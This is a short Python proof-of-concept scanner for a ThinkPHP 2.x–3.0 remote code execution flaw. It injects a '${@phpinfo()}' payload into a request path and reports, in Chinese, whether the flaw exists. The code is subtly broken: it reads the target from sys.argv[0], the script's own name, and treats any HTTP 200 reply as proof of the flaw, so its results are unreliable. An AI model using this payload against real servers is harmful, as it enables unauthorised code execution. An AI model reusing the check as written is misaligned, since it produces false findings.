import sys
import requests

url=sys.argv[0]+'index.php?s=/index/index/xxx/${@phpinfo()}'
res=requests.get(url)
if res.status_code==200:
    print('存在2.x-3.0 rce')
else:
    print('不存在')



    